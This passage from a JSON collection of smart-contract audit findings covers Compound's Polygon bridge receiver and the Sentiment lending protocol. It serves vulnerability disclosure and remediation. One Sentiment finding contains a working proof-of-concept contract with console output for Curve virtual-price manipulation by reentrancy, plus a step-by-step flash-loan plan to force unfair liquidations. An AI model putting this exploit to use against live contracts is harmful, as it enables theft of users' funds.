Timelock. These two approaches seem functionally equivalent; we will not make this update.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Polygon Bridge Receiver Audit",
      "source_link": "https://blog.openzeppelin.com/compound-polygon-bridge-receiver-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10355",
      "title": "Lack of indexed parameter",
      "impact": "LOW",
      "content": "Within [`BaseBridgeReceiver.sol`](https://github.com/compound-finance/comet/tree/silver/polygon-deploy/contracts/bridges/BaseBridgeReceiver.sol), [line 20](https://github.com/compound-finance/comet/tree/silver/polygon-deploy/contracts/bridges/BaseBridgeReceiver.sol#L20) does not have the event parameters indexed.\n\n\nConsider [indexing event parameters](https://solidity.readthedocs.io/en/latest/contracts.html#events) to improve the off-chain services’ ability to search and filter for specific events.\n\n\n***Update:** Resolved in [pull request 666](https://github.com/compound-finance/comet/pull/666) at commit [4b9bcb5](https://github.com/compound-finance/comet/pull/666/commits/4b9bcb51fb598639a2e26b77ab9306cd9d2110a4).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Polygon Bridge Receiver Audit",
      "source_link": "https://blog.openzeppelin.com/compound-polygon-bridge-receiver-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10354",
      "title": "Inconsistent usage of uint across loops",
      "impact": "LOW",
      "content": "In the [`BaseBridgeReceiver`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L6) contract, the [`processMessage`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L107) function uses a [`uint8`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L130) variable type to process a message and iterate over its `targets`.\n\n\nHowever, when executing proposals, the `for` loop utilizes a [`uint`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L159) variable type.\n\n\nEven though the index of the `for` loop is [not protected against overflow](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L133), in the unlikely case that more than 256 transactions are sent in a single proposal, the transaction would [revert as there would be an identical transaction already queued](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L131).\n\n\nConsider using the same type in both loops for consistency, or documenting the reason for having different implicit loop bounds. Additionally, consider removing the `unchecked` statement to reduce the attack vector when overflowing.\n\n\n***Update:** Resolved in [pull request 666](https://github.com/compound-finance/comet/pull/666) at commit [55712fb](https://github.com/compound-finance/comet/pull/666/commits/55712fbb1501e876111d221740ddd2fa233dba3e).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Polygon Bridge Receiver Audit",
      "source_link": "https://blog.openzeppelin.com/compound-polygon-bridge-receiver-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10353",
      "title": "Inconsistent transaction expiry",
      "impact": "LOW",
      "content": "Within the [`executeTransaction` function](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L175) from the `Timelock` contract, a transaction is considered valid and will be executed as long as the transaction block’s timestamp is *less than or equal* to `eta + GRACE_PERIOD`. However, the [`BaseBridgeReciever` contract](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/vendor/Timelock.sol#L82) only considers a transaction valid if the transaction block’s timestamp is instead *strictly less than* that same calculation.\n\n\nConsider updating the contracts’ logic to agree on the expiration of a transaction.\n\n\n***Update:** Resolved in [pull request 666](https://github.com/compound-finance/comet/pull/666/) at commit [fcb9ef3](https://github.com/compound-finance/comet/pull/666/commits/fcb9ef3241503d209a76178d205a2dd6b4fd876f).*",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Polygon Bridge Receiver Audit",
      "source_link": "https://blog.openzeppelin.com/compound-polygon-bridge-receiver-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10352",
      "title": "Reversions in Polygon will not be seen in Ethereum",
      "impact": "LOW",
      "content": "The protocol implements the functionality to send sensitive governor actions from Ethereum to the Polygon network by using its bridge.\n\n\nHowever, due to the unidirectional path of such instructions, the mainnet [governor](https://etherscan.io/address/0xc0da02939e1441f497fd74f78ce7decb17b66529) will always assume that orders sent to Polygon were submitted correctly. This means that in case of a reverted proposal when [processing the message](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L107), the governor will not be aware of it and it will not allow to retry the same proposal without going through the entire lifecycle again.\n\n\nConsider handling failed submissions of proposals and completing the loop back from Polygon to Ethereum to allow retriable proposals.\n\n\n***Update:** Acknowledged, not resolved. The Compound team stated:*\n\n\n\n> *Comet’s approach to L2s is unidirectional by design. Creating an omnidirectional loop would increase complexity and potentially create additional vectors for malicious activity.*\n> \n>",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Polygon Bridge Receiver Audit",
      "source_link": "https://blog.openzeppelin.com/compound-polygon-bridge-receiver-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10351",
      "title": "Proposals cannot be canceled",
      "impact": "MEDIUM",
      "content": "A proposal can queue its transactions in the `Timelock` contract by [processing the message](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L107) through the `BaseBridgeReceiver` contract.\n\n\nHowever, even though the `Timelock` contract allows the `admin` address (in this case, the `BaseBridgeReceiver` contract) to [cancel a certain transaction](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/vendor/Timelock.sol#L67), the `BaseBridgeReceiver` contract does not implement the functionality to call that method.\n\n\nThis means that if a transaction needs to be canceled, a new proposal would need to be passed to change the `admin` address to an EOA or a contract that has the ability to cancel transactions. After the proposal is passed, it would need to be executed, and then the problematic transaction can finally be manually canceled.\n\n\nMoreover, as the [`executeProposal` function](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/bridges/BaseBridgeReceiver.sol#L155) from the `BaseBridgeReceiver` contract is not access-controlled, any user may notice that a faulty or malicious transaction is queued and ready to be executed and the protocol will not have the option to stop them from executing it.\n\n\nConsider implementing the functionality to cancel a transaction in the `BaseBridgeReceiver` contract.\n\n\n***Update:** Acknowledged, not resolved. The Compound team stated:*\n\n\n\n> *L2Timelock proposals cannot be canceled by design.*\n> \n> \n> *Transactions begin as a proposal on L1. The L1 proposal is placed in the L1 Timelock (where it can be canceled), is queued for a period of time, and then is executed.*\n> \n> \n> *The execution of the L1 proposal results in the transaction being enqueued on the L2. It is in a pending state for a period of time, but as far as governance is concerned it is as though the proposal has already been executed.*\n> \n> \n> *We accept that once a transaction is enqueued on the L2, there is no way to cancel it.*\n> \n> \n> *Canceling an L2 proposal would require granting the authority to cancel to some entity on the L2; this is undesirable since the ability to cancel proposals is also a power that could be used maliciously.*\n> \n>",
      "summary": "\nThis bug report is about a transaction queuing issue in the `Timelock` contract. The `admin` address (in this case, the `BaseBridgeReceiver` contract) has the ability to cancel a certain transaction, but the `BaseBridgeReceiver` contract does not implement the functionality to call that method. This means that if a transaction needs to be canceled, a new proposal would need to be passed to change the `admin` address to an EOA or a contract that has the ability to cancel transactions. Furthermore, the `executeProposal` function from the `BaseBridgeReceiver` contract is not access-controlled, which means any user may execute a faulty or malicious transaction.\n\nThe Compound team has acknowledged the issue but has stated that it cannot be resolved due to design constraints. L2Timelock proposals cannot be canceled, and once a transaction is enqueued on the L2, there is no way to cancel it. Canceling an L2 proposal would require granting the authority to cancel to some entity on the L2, which is undesirable since the ability to cancel proposals is also a power that could be used maliciously.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Polygon Bridge Receiver Audit",
      "source_link": "https://blog.openzeppelin.com/compound-polygon-bridge-receiver-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "10350",
      "title": "BaseBridgeReceiver can be rendered inoperable by incorrectly setting the localTimelock",
      "impact": "MEDIUM",
      "content": "The intricate relationship between the `BaseBridgeReceiver` and `TimeLock` contracts requires extra caution when updating the `localTimelock` in the `BaseBridgeReceiver`, as an incorrect update could render the entire contract inoperable. The following errors must be avoided:\n\n\n* Setting the new `localTimelock` value to an address that does not implement the `Timelock` interface (this includes sending the zero address by mistake)\n* Setting the `localTimelock` variable to an address that implements the `Timelock` interface, but with an [`admin`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/vendor/Timelock.sol#L11) (or [`pendingAdmin`](https://github.com/compound-finance/comet/blob/2eb33b5e8454dba148373b6cb64ede4f7436fad7/contracts/vendor/Timelock.sol#L12)) variable that is not set to the address of the `BaseBridgeReceiver` contract\n\n\nIf either of these two events were to happen, the `BaseBridgeReceiver` contract would be unable to successfully send any new messages to the `Timelock` contract and, as a result, would not be able to update its own `localTimelock` variable to address this issue.\n\n\nConsider checking that the new `Timelock` address implements the `ITimelock` interface in the `initialize` and `setLocalTimelock` functions. Also consider checking that the `Timelock` contract’s `admin` (or `pendingAdmin`) variable is set to the `BaseBridgeReceiver` contract’s address in both the `initialize` and `setLocalTimelock` functions before updating the `localTimelock` variable.\n\n\n***Update:** Resolved in [pull request 665](https://github.com/compound-finance/comet/pull/665) at commit [1ffc7e9](https://github.com/compound-finance/comet/pull/665/commits/1ffc7e94bb50f15393ef3ef31d0b27dc3609dec2).*",
      "summary": "\nThis bug report is about the relationship between the `BaseBridgeReceiver` and `TimeLock` contracts. When updating the `localTimelock` in the `BaseBridgeReceiver`, two errors must be avoided: setting the new `localTimelock` value to an address that does not implement the `Timelock` interface, and setting it to an address that implements the `Timelock` interface, but with an `admin` or `pendingAdmin` variable that is not set to the address of the `BaseBridgeReceiver` contract. If either of these errors occur, the `BaseBridgeReceiver` contract would be unable to send any new messages to the `Timelock` contract and, as a result, would not be able to update its own `localTimelock` variable.\n\nTo prevent this, it is important to check that the new `Timelock` address implements the `ITimelock` interface in the `initialize` and `setLocalTimelock` functions, and check that the `Timelock` contract’s `admin` (or `pendingAdmin`) variable is set to the `BaseBridgeReceiver` contract’s address in both the `initialize` and `setLocalTimelock` functions before updating the `localTimelock` variable. This bug has been resolved in Pull Request 665 at commit 1ffc7e9.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Compound Polygon Bridge Receiver Audit",
      "source_link": "https://blog.openzeppelin.com/compound-polygon-bridge-receiver-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "5644",
      "title": "M-1: [WP-M1] getRewards() can be triggered by external parties which will result in the rewards not be tracking properly by the system",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2022-12-sentiment-judging/issues/15 \n\n## Found by \nWATCHPUG\n\n## Summary\n\n`ConvexRewardPool#getReward(address)` can be called by any address besides the owner themself.\n\n## Vulnerability Detail\n\nThe reward tokens will only be added to the assets list when `getReward()` is called.\n\nIf there is a third party that is \"helping\" the `account` to call `getReward()` from time to time, by keeping the value of unclaimed rewards low, the account owner may not have the motivation to take the initiative to call `getReward()` via the `AccountManager`.\n\nAs a result, the reward tokens may never get added to the account's assets list.\n\n## Impact\n\nIf the helper/attacker continuously claims the rewards on behalf of the victim, the rewards will not be accounted for in the victim's total assets.\n\nAs a result, the victim's account can be liquidated while actual there are enough assets in their account, it is just that these are not accounted for.\n\n## Code Snippet\n\nhttps://github.com/sentimentxyz/controller/blob/507274a0803ceaa3cbbaf2a696e2458e18437b2f/src/convex/ConvexBoosterController.sol#L31-L46\n\nhttps://arbiscan.io/address/0x63F00F688086F0109d586501E783e33f2C950e78\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nConsider adding all the reward tokens to the account's assets list in `ConvexBoosterController.sol#canDeposit()`.\n\n## Discussion\n\n**r0ohafza**\n\nfix: https://github.com/sentimentxyz/controller/pull/54",
      "summary": "\nThis bug report concerns the `ConvexRewardPool#getReward(address)` function in the `ConvexBoosterController.sol` contract, which can be called by any address besides the owner. If a third party helps the owner to call the `getReward()` function, the reward tokens may not be added to the account's assets list, which can lead to the account being liquidated while there are enough assets in the account. The bug was found by WATCHPUG and the recommendation is to add all the reward tokens to the account's assets list in `ConvexBoosterController.sol#canDeposit()`. The bug was fixed by r0ohafza in a pull request.",
      "quality_score": 4,
      "rarity_score": 2,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "Sentiment Update #2",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2022-12-sentiment-judging/issues/15",
      "tags": [
        "Business Logic"
      ],
      "finders": [
        "WATCHPUG"
      ]
    },
    {
      "id": "5643",
      "title": "H-1: H-01 wstETH-ETH Curve LP Token Price can be manipulated to Cause Unexpected Liquidations",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2022-12-sentiment-judging/issues/7 \n\n## Found by \nBahurum, GalloDaSballo\n\n## Summary\n\nThe wsteETH-ETH LP token is priced via it's [`virtual_price`](https://github.com/sherlock-audit/2022-12-sentiment/blob/main/oracle/src/curve/StableCurveEthOracle.sol#L72)\n\nThrough what [Chainalysis called View only Reentrancy](https://chainsecurity.com/heartbreaks-curve-lp-oracles/), we can reduce the value of `virtual_price`, causing the RiskEngine to trigger a liquidation event.\n\n## Vulnerability Detail\n\nPer some testing I made, we know that the Debt for such an account will be denominated in WETH, this price cannot be tampered.\n\nHowever, the price of the ETH-wstETH LP Token can be manipulated by calling the RiskEngine while reEntering from the `POOL.remove_liquidity` function.\n\nThis is possible because the function will send ETH first, before updating it's internal wstETH balances.\n\nTo test the maximum impact I simulated borrowing an infinite amount of WETH (by impersonating the GMX Vault).\n\nIf that amount of ETH were available on Arbitrum, we can achieve over 10x in price suppression, effectively making any \"normal\" account instantly liquidatable.\n\nThe estimated cost of the attack is 60 BPS of the total ETH used (due to price impact)\n\n## Impact\n\nBecause of the price manipulation, we can trigger unfair liquidations to our advantage, because the cost of manipulation is in the 50BPS range, any time a big enough deposit is made, it becomes profitable to force liquidate them.\n\nIn the theoretical scenario shown below (borrowing from GMX Vault), I can effectively liquidate any account using the token.\nA more pragmatic scenario is listed below as well\n\n## Code Snippet\n\nBelow a simulation showing how to achieve the Virtual Price Manipulation, the last piece of the attack would be to call liquidate on an account while re-entering\n\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.10;\n\n\nimport {IERC20} from \"@oz/token/ERC20/IERC20.sol\";\nimport {SafeERC20} from \"@oz/token/ERC20/utils/SafeERC20.sol\";\nimport {ReentrancyGuard} from \"@oz/security/ReentrancyGuard.sol\";\n\ninterface IAccount {\n  function getAssets() external view returns (address[] memory);\n  function getBorrows() external view returns (address[] memory);\n}\ninterface IRiskEngine {\n  function getBalance(address account) external view returns (uint);\n  function getBorrows(address account) external view returns (uint);\n}\n\ninterface ISentimentCore {\n  function riskEngine() external view returns (address);\n}\n\ninterface ICurvePool {\n  function add_liquidity(uint256[2] memory amounts, uint256 min_mint_amount) external payable returns (uint256);\n  function remove_liquidity(uint256 amount, uint256[2] memory min_amounts) external returns (uint256);\n  function get_virtual_price() external view returns (uint256);\n}\n\ninterface ILP {\n  function balanceOf(address) external view returns (uint256);\n}\n\ncontract VirtualPriceManip {\n  ICurvePool POOL = ICurvePool(0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80);\n  ILP LP = ILP(0xDbcD16e622c95AcB2650b38eC799f76BFC557a0b);\n  ILP WSTETH = ILP(0x5979D7b546E38E414F7E9822514be443A4800529);\n  // Get WETH\n\n  // Check Virtual Price\n\n  // Deposit into Curve\n\n  // Check Virtual Price\n\n  // Withdraw, and ReEnter\n\n  // Check Virtual Price\n\n  // End, Check Virtual Price\n\n  event Debug(string name, uint256 value);\n\n  function fakeSentimentPrice() internal returns (uint256){\n    uint256 FAKE_WETH_PRICE = 1e18;\n    return FAKE_WETH_PRICE * POOL.get_virtual_price() / 1e18;\n  }\n\n  function startAttack() external payable {\n    uint256 amt = msg.value;\n\n    // 1. Check Virtual Price\n    emit Debug(\"Virtual Price 1\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 1\", fakeSentimentPrice());\n\n    // 2. Curve deposit\n    uint256[2] memory dep = [amt, 0];\n    POOL.add_liquidity{value: amt}(dep, 1);\n\n    // 3. Check Virtual Price\n    emit Debug(\"Virtual Price 3\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 3\", fakeSentimentPrice());\n\n    // 4. Curve Withdraw\n    // TODO: This is where profit maximization math will be necessary\n    uint256[2] memory dep2 = [uint256(0), uint256(0)];\n    POOL.remove_liquidity(LP.balanceOf(address(this)), dep2);\n\n    // 6. Check Virtual Price\n    emit Debug(\"Virtual Price 6\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 6\", fakeSentimentPrice());\n\n    // TODO: Check loss in ETH and compare vs wstETH we now have\n    // Loss is there, but should be marginal / imbalance + fees\n    emit Debug(\"Msg.value\", msg.value);\n    emit Debug(\"This Balance\", address(this).balance);\n    emit Debug(\"Delta\", msg.value - address(this).balance);\n\n    emit Debug(\"WstEthBalance\", WSTETH.balanceOf(address(this)));\n  }\n\n  receive() external payable {\n    // 5. Reenter here\n\n    // Check Virtual Price\n    emit Debug(\"Virtual Price 5\", POOL.get_virtual_price());\n    emit Debug(\"fakeSentimentPrice 5\", fakeSentimentPrice());\n  }\n}\n```\n\nHere the Brownie Console for the maximum theoretical attack\n\n```python\n\nweth = Contract.from_explorer(\"0x82aF49447D8a07e3bd95BD0d56f35241523fBab1\")\nwhale = accounts.at(\"0x489ee077994b6658eafa855c308275ead8097c4a\", force=True)\n \nweth.transfer(a[0], weth.balanceOf(whale), {\"from\": whale})\nweth.withdraw(weth.balanceOf(a[0]), {\"from\": a[0]})\nc = VirtualPriceManip.deploy({\"from\": a[0]})\nc.startAttack({\"from\": a[0], \"value\": a[0].balance() * 99 / 100})\n \nFetching source of 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1 from api.arbiscan.io...\nFetching source of 0x8b194bEae1d3e0788A1a35173978001ACDFba668 from api.arbiscan.io...\nTransaction sent: 0x69a4ee6fba72894d2e6c7ba556a6df8bb2159981e09b7dd947283368628baefa\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  TransparentUpgradeableProxy.transfer confirmed   Block: 42567825   Gas used: 39080 (0.20%)\n\nTransaction sent: 0xfecb0db00b3db0b7b6cf22bc1adc92d16169060ead3a9c13f88a19b0c57fd666\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 0\n  TransparentUpgradeableProxy.withdraw confirmed   Block: 42567826   Gas used: 30937 (0.15%)\n\nTransaction sent: 0x198d4b73e7def112903606efa77c0add9910e7f3e86186e310a0adbfec0adebc\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 1\n  VirtualPriceManip.constructor confirmed   Block: 42567827   Gas used: 647070 (3.24%)\n  VirtualPriceManip deployed at: 0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6\n\nTransaction sent: 0x101e212ca64ed3fc6595c15c30706a8075a010ed866ba5b230cb494f9ac20c5c\n  Gas price: 0.0 gwei   Gas limit: 20000000   Nonce: 2\n  VirtualPriceManip.startAttack confirmed   Block: 42567828   Gas used: 354622 (1.77%)\n\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1005466150529603227)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1005466150529603227)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1005678057072654996)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1005678057072654996)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 93457469619424556)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 93457469619424556)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1005678057072654996)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1005678057072654996)]), OrderedDict([('name', 'Msg.value'), ('value', 86826027227418610000000)]), OrderedDict([('name', 'This Balance'), ('value', 83541864626282883099978)]), OrderedDict([('name', 'Delta'), ('value', 3284162601135726900022)]), OrderedDict([('name', 'WstEthBalance'), ('value', 2736183720644597163208)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_value', 81436145961234587181162)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('value', 2736183720644597163208)]), OrderedDict([('_from', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 81436145961234587181162)])], 'AddLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (86826027227418610000000, 0)), ('fees', (11884971933620921875, 9942362504203593908)), ('invariant', 86698045640581035174753), ('token_supply', 86190407433150506590178)])], 'RemoveLiquidity': [OrderedDict([('provider', '0x602C71e4DAC47a042Ee7f46E0aee17F94A3bA0B6'), ('token_amounts', (83541864626282883099978, 2736183720644597163208)), ('fees', (0, 0)), ('token_supply', 4754261471915919409016)])]}\n\n\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n>>> eth_to_convert = 2736183720644597163208 * 1.08\n>>> 3284162601135726900022 - eth_to_convert\n3.290841828395613e+20\n>>> 3.290841828395613e+20 / 86826027227418610000000 * 100\n## 37 BPS to perform the attack, remaining costs would bring it up to around 50 BPS (swap wstETH, cost of liquidations, etc..)\n0.3790155939964975\n\n## See `fakeSentiment5 vs fakeSentimen1`\n>>> 93457469619424556 / 1005466150529603227 * 100\n9.294939423887941\n\n\"\"\"\nPrice is 9% of it's original value, we achieve a 10X price depreciation, allowing us to liquidate any user that has taken minimal leverage\n\"\"\"\n\n```\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAt this time, I would recommend NOT to use the ETH-stETH LP Token as the price is manipulatable.\nThe only rational way I could expect this to be solved is for Chainlink to offer virtual_price oracles, or the development of a TWAP for the virtual_price.\n\n\n## Additional Considerations\n\nThe theoretical maximum attack allows to effectively liquidate any account that uses the stETH-WETH Pool.\n\nIn practice, via an AAVE Flashloan I'm able to borrow up to 14.5k WETH, which allows to move the price by over 11%, meaning that some accounts, that are levered at around 90% could be unfairly liquidated.\n\n```python\n>>> history[-1].events\n{'Debug': [OrderedDict([('name', 'Virtual Price 1'), ('value', 1005466094471744332)]), OrderedDict([('name', 'fakeSentimentPrice 1'), ('value', 1005466094471744332)]), OrderedDict([('name', 'Virtual Price 3'), ('value', 1005497298777214105)]), OrderedDict([('name', 'fakeSentimentPrice 3'), ('value', 1005497298777214105)]), OrderedDict([('name', 'Virtual Price 5'), ('value', 890315892210177531)]), OrderedDict([('name', 'fakeSentimentPrice 5'), ('value', 890315892210177531)]), OrderedDict([('name', 'Virtual Price 6'), ('value', 1005497298777214105)]), OrderedDict([('name', 'fakeSentimentPrice 6'), ('value', 1005497298777214105)]), OrderedDict([('name', 'Msg.value'), ('value', 1452330000000000000000)]), OrderedDict([('name', 'This Balance'), ('value', 713314090131700921245)]), OrderedDict([('name', 'Delta'), ('value', 739015909868299078755)]), OrderedDict([('name', 'WstEthBalance'), ('value', 677574531693017948098)])], 'Transfer': [OrderedDict([('_from', '0x0000000000000000000000000000000000000000'), ('_to', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('_value', 1449753409949781400798)]), OrderedDict([('from', '0x6eB2dc694eB516B16Dc9FBc678C60052BbdD7d80'), ('to', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('value', 677574531693017948098)]), OrderedDict([('_from', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('_to', '0x0000000000000000000000000000000000000000'), ('_value', 1449753409949781400798)])], 'AddLiquidity': [OrderedDict([('provider', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('token_amounts', (1452330000000000000000, 0)), ('fees', (192842135570862938, 176890872766115807)), ('invariant', 6238313797265075968081), ('token_supply', 6204014881865700809814)])], 'RemoveLiquidity': [OrderedDict([('provider', '0xE7eD6747FaC5360f88a2EFC03E00d25789F69291'), ('token_amounts', (713314090131700921245, 677574531693017948098)), ('fees', (0, 0)), ('token_supply', 4754261471915919409016)])]}\n>>> 890315892210177531 / 1005466094471744332\n## Around 11.2% Price Manipulation with 14.5k ETH used\n0.8854757978467043\n```\n\nTo put it in simple terms, the cost of this attack is around $90k and it will be profitable to liquidate any position above $100k\n\n## Discussion\n\n**Evert0x**\n\nComment from WatchPug (lead senior)\n\n> We find the issue to be valid.\n> \n> However, the economics of the attack may not be profitable, and the preconditions and requirements for such an attack can be narrow. We also believe that flashloans cannot be utilized as the entrance for the attack: `POOL.remove_liquidity()` will add a reentrancy lock which prevents `remove_liquidity()` on the liquidation impounded lpToken assets.\n> \n> As the revenue/profit from such an attack cannot be used to repay the loan within the same block, flashloans cannot be used.\n\nAlthough the impact is high we judge the issue to be medium severity because of the requirements and conditions described in the comment from WatchPug.\n\n\n**bahurum**\n\nEscalate for 50 USDC. \nI believe the issue has been downgraded incorrectly to medium severity. The lead senior watson justifies the downgrading with 2 arguments, which I would like to dispute both.\n1. **The attack may not be profitable and needs narrow preconditions**: The attack is profitable as in the `Additional Considerations` section, the watson shows by mistake the impact of a 1452 ETH loan instead of 14520 ETH flash-borrowable from Aave on arbitrum (see 'Msg.value' field in debug log). With 14.5k ETH the virtual price would be reduced by 45%, which is much more than 11%. Any account holding a substantial amount of this curve LP and with risky margin will be liquidated (for example if 50 % of collateral is WstETH-ETH curve LP and margin is 20% it will be liquidated). Here is a realistic attack scenario:\n   - The accounts holding the LP token amount to 2M $ in total value and half of them (1M $ value) can be liquidated with 40% manipulation of the LP price\n   - Attacker flash borrows 14k WETH (17M $) and converts to ETH\n   - Attacker calls `add_liquidity` with 16M $ worth of ETH, keeps 1M $ for liquidations\n   - Attacker calls `remove_liquidity` with all LP obtained\n   - On reentrant call:\n        - swaps 1M $ for the required tokens needed for liquidation\n        - liquidates accounts and gets an average liquidation premium of at least 20%, so 200k $ in total\n    - Exit call to attacker's `fallback` or `receive` function\n    - Execution of call to `remove_liquidity` resumes and finishes\n     - Attacker swaps 200k $ worth of stolen tokens back to ETH. Note that WstETH-ETH LP stolen can also be swapped back to ETH since the call to `remove_liquidity` is already exited.\n   - Repay the flashloan and profit. Cost of pool imbalanace + loan is around 0.5 % as shown in the PoC, so about 85k $. Profit is at least 100k $ in this scenario. The attacker doesn't need to provide any funds up front.\n2.  **flashloans cannot be utilized as the entrance for the attack**: This is not true since the WstETH-ETH LP tokens are sent to the attacker during liquidation, which occurs during the call to `remove_liquidity`, but they can be swapped back to ETH after the end of the call to `remove_liquidity` and before the end of the tx. So there is no reentrancy in `remove_liquidity` in this attack. See the scenario above.\n\nIn addition, this bug is well known and probably calls to the pool's `get_virtual_price` are being scanned to find vulnerable contracts, so black hats would have noticed the bug very soon.\n\nFinally, and not related to the escalation, I would like to suggest again a fix as I made some confusion when I suggested it in my own submission:\n\n```diff\n    function getPrice(address token) external view returns (uint) {\n        ICurvePool pool = ICurveLP(token).minter();\n+       uint256[2] calldata amounts;\n+       pool.remove_liquidity(0, amounts);\n        address coin;\n        uint price;\n        uint minPrice = oracleFacade.getPrice(WETH);\n        for(uint i; i<N_COINS; i++) {\n            coin = pool.coins(i);\n            if (coin != ETH) {\n                price = oracleFacade.getPrice(coin);\n                minPrice = (price < minPrice) ? price : minPrice;\n            }\n        }\n\n        return minPrice.mulWadDown(pool.get_virtual_price());\n    }\n```\n\n**sherlock-admin**\n\n > Escalate for 50 USDC. \n> I believe the issue has been downgraded incorrectly to medium severity. The lead senior watson justifies the downgrading with 2 arguments, which I would like to dispute both.\n> 1. **The attack may not be profitable and needs narrow preconditions**: The attack is profitable as in the `Additional Considerations` section, the watson shows by mistake the impact of a 1452 ETH loan instead of 14520 ETH flash-borrowable from Aave on arbitrum (see 'Msg.value' field in debug log). With 14.5k ETH the virtual price would be reduced by 45%, which is much more than 11%. Any account holding a substantial amount of this curve LP and with risky margin will be liquidated (for example if 50 % of collateral is WstETH-ETH curve LP and margin is 20% it will be liquidated). Here is a realistic attack scenario:\n>    - The accounts holding the LP token amount to 2M $ in total value and half of them (1M $ value) can be liquidated with 40% manipulation of the LP price\n>    - Attacker flash borrows 14k WETH (17M $) and converts to 